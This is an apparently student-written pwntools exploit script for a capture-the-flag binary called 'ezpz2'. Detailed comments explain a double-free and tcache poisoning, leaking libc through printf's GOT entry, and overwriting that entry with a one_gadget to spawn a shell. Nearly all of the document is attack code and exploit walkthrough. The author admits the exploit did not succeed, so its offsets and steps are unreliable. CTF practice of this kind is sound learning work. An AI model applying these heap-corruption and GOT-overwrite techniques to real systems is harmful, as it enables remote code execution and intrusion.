#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# To begin, I discovered a double free vulnerability in the program, such that if
# I did the following:
# create()
# delete(0)
# delete(0)
# result = ask(0)
# then result would store an address such as 0x8526170.

# By connecting the binary to gdb and using 'vis_heap_chunks', we can see this is the
# address of the first tcachebin. Also, if we use command 'bins' in gdb we can see
# tcahcebins contains a loop of pointers. Hence, I thought I could approach this in
# a similar way to earlier challenges and overwrite an address on the heap with
# another value.

# However, looking in binary ninja I discovered there wasn't a win function, and there
# weren't any other functions within the binary I would want to jump to.

# So, I realised I am probably going to have to overwrite an entry in the GOT table
# with a one gadget. To do this, we can use the command 'one_gadget /path/to/libc' in 
# the terminal to see all available one gadgets in a given version of libc. In gdb, we 
# can use 'vmmap' to see the path to libc is '/lib/i386-linux-gnu/libc-2.27.so', so we 
# can use this in our one_gadget command.

# From this, we are given various one gadgets. For one to work, we need to ensure the
# given constraints on certain registers are true, and we need to know the libc base 
# address such that we can add the given offset to it to get the gadget's address.

# So, I now need to determine a way to leak a libc address, and from that I can 
# determine the base of libc. To do so, I created and freed several clones, and then
# for the third clone modified the value stored to be the GOT address for printf
# repeated several times. If I then viewed the contents of clone 3, it would now 
# display the libc address of printf.

# Given this libc leak, we can now use command:
# readelf -s /lib/i386-linux-gnu/libc-2.27.so | grep ' printf'
# to see the offset of printf in the libc being used. If we then subtract this offset
# from our leak, we now have the base of libc.

# NOTE: For remote, I would need to use a libc-database to figure out the version of
# libc being used and recalculate the libc base accordingly.

# With the address of libc's base, we can now determine the address of our one gadget
# using its offset, and we now want to overwrite this GOT entry for printf with the
# address of our one gadget. We can do this by setting the value of one of our clones
# to be this address, and then when printf is called again it should pop a shell.

# However, I was unable to get this to achieve my goal. This may be due to the
# constraints for my one gadget not being met, or most likely due to a mistake or
# incorrect assumption I have made during my attempt.

# The script:
PROGNAME = "challenges/./ezpz2"
REMOTEIP = "plsdonthaq.me"
REMOTEPORT = 7002

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

def menu():
    p.recvuntil("refresh): ")

def create():
    p.sendline("c")
    p.recvuntil("Created new question. ",timeout=0.1)
    index = p.recvline()[-2:-1]
    log.info("Create: {}".format(int(index)))
    menu()
    return index

def delete(index):
    log.info("Delete: {}".format(int(index)))
    p.sendline("d")
    p.recvuntil("question id: ")
    p.sendline(str(index))
    menu()

def setQ(index, name):
    log.info("Set: {} to {}".format(int(index), str(name)))
    p.sendline("s")
    p.recvuntil("question id: ")
    p.sendline(str(index))
    p.recvuntil("your question: ")
    p.sendline(name)
    menu()

def ask(index):
    log.info("Ask: {}".format(int(index)))
    p.sendline("a")
    p.recvuntil("question id: ")
    p.sendline(str(index))
    p.recvuntil("perhaps: ",timeout=0.1)
    result = p.recvline()[1:-2]
    menu()
    return result

# To begin, we create and delete various clones to setup the heap linked list how
# we need it before filling it with the GOT address of printf.
create()
create()
delete(0)
delete(1)
create()
create()

# Now we can set the value of clone 3 to be filled with the GOT address of printf.
# Here I use the ELF file, but we can also see in binary ninja the address of 
# printf@GOT is 0x804b010.
setQ(3, p32(elf.got["printf"]) * 15)

# Now we want to view the contents of clone 2, with the last 4 bytes of this ouput
# being the libc address of printf.
printfLeak = u32(ask(2)[:4])

# By searching in the ELF file, we can determine the printf offset in the libc being
# used, and we subtract this from the leak.
libcBase = printfLeak - 0x000513a0

# We now create and delete additional clones to prepare for our next write.
create()
delete(4)

# This is where we overwrite the GOT entry for printf with our one gadget which will
# pop a shell. We get this gadget's address by simply adding the offset given by the
# one_gadget command to the libc base.
gadget = libcBase + 0x3d123
setQ(4, p32(gadget))

# We then create a new clone, which should trigger our one gadget and pop a shell.
create()

# Given we now have shell, we can access the flag.
p.interactive()